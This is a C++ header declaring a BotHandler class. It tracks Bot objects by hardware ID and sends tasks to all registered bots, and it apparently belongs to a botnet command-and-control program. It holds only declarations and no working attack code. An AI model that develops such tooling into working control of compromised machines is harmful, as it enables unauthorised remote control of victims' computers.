#pragma once

#include <iostream>
#include <map>
#include <utility>

#include "../Task/Task.h"
#include "Bot.h"

class BotHandler {
private:
  typedef std::map<std::string, class Bot *> BotMap;
  typedef BotMap::iterator BotMapIter;
  typedef std::pair<std::string, class Bot *> BotMapPair;

  static BotMap BotList;

public:
  static void addBot(class Bot *bot);
  static void removeBot(std::string *HWID);
  static Bot *getBot(std::string *HWID);

  static void addTaskToAllBots(class Task *task);

  static int getBotCount();

  static BotHandler::BotMapIter getBotListIteratorBegin();
  static BotHandler::BotMapIter getBotListIteratorEnd();
};
